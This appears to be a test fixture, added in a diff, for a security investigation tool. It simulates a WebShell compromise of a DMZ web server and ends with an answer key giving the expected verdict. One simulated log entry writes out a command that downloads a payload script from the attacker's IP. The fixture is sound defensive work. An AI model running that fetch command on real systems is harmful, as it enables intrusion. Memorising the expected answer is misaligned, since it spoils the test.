@@ -1,0 +1,123 @@
+{
+  "investigation_intent": "外网 IP 203.0.113.88 疑似 WebShell 打穿 web-01，查是否横向",
+  "scenarios": ["S2", "S3"],
+  "params": {
+    "attacker_ip": "203.0.113.88",
+    "alert_time": "2026-06-23T11:05:00+08:00",
+    "time_start": "2026-06-23T10:00:00+08:00",
+    "time_end": "2026-06-23T14:00:00+08:00",
+    "host_ips": {
+      "web-01": "10.0.1.5",
+      "db-01": "10.0.2.10"
+    }
+  },
+  "completeness_precheck": {
+    "overall_verdict": "partial_traceable",
+    "confidence": 0.75,
+    "next_skill_blocked": false,
+    "data_gaps": ["ssh_auth 覆盖不全，无法确认横向"]
+  },
+  "evidence_bundles": {
+    "waf_alert": [
+      {
+        "evidence_id": "waf-201",
+        "src_ip": "203.0.113.88",
+        "timestamp": "2026-06-23T11:05:00+08:00",
+        "url": "/upload/1.php?cmd=id",
+        "payload": "cmd=id",
+        "action": "block",
+        "rule_id": "942100",
+        "host": "web-01"
+      }
+    ],
+    "web_access_log": [
+      {
+        "evidence_id": "web-201",
+        "src_ip": "203.0.113.88",
+        "timestamp": "2026-06-23T11:04:58+08:00",
+        "url": "/upload/1.php",
+        "method": "POST",
+        "status": 200,
+        "host": "web-01"
+      }
+    ],
+    "host_exec": [
+      {
+        "evidence_id": "exec-201",
+        "event_type": "exec",
+        "host": "web-01",
+        "host_ip": "10.0.1.5",
+        "timestamp": "2026-06-23T11:06:12+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "listener_pid": 1481,
+        "exe": "/usr/bin/id",
+        "command": ["id"],
+        "command_line": "id",
+        "cwd": "/var/www/html"
+      },
+      {
+        "evidence_id": "exec-202",
+        "event_type": "exec",
+        "host": "web-01",
+        "host_ip": "10.0.1.5",
+        "timestamp": "2026-06-23T11:08:30+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "listener_pid": 1481,
+        "exe": "/usr/bin/curl",
+        "command": ["curl", "-o", "/tmp/x", "http://203.0.113.88/payload.sh"],
+        "command_line": "curl -o /tmp/x http://203.0.113.88/payload.sh",
+        "cwd": "/var/www/html"
+      }
+    ],
+    "host_connect": [
+      {
+        "evidence_id": "connect-201",
+        "event_type": "active_connect",
+        "host": "web-01",
+        "host_ip": "10.0.1.5",
+        "timestamp": "2026-06-23T11:08:28+08:00",
+        "listener_pid": 1481,
+        "listener_port": 443,
+        "dst_ip": "203.0.113.88",
+        "dst_port": 80
+      }
+    ],
+    "host_file_op": [
+      {
+        "evidence_id": "file-201",
+        "event_type": "file_op",
+        "host": "web-01",
+        "timestamp": "2026-06-23T11:07:00+08:00",
+        "path": "/var/www/html/upload/1.php",
+        "action": "create"
+      }
+    ],
+    "ssh_auth": [
+      {
+        "evidence_id": "ssh-201",
+        "host": "db-01",
+        "timestamp": "2026-06-23T11:15:00+08:00",
+        "src_ip": "10.0.1.5",
+        "user": "root",
+        "result": "Failed"
+      }
+    ],
+    "firewall_log": [],
+    "asset_inventory": [
+      {"hostname": "web-01", "ip": "10.0.1.5", "zone": "dmz"},
+      {"hostname": "db-01", "ip": "10.0.2.10", "zone": "internal"}
+    ]
+  },
+  "_meta": {
+    "scenario_label": "S2 打穿无横向 — initial_access_only",
+    "expected_verdict": "initial_access_only",
+    "correlation_joins": [
+      "waf_to_web_access_by_ip",
+      "d2_exec_connect_same_listener",
+      "d2_exec_file_same_host"
+    ],
+    "missing_joins": ["web_access_to_host_exec"]
+  }
+}
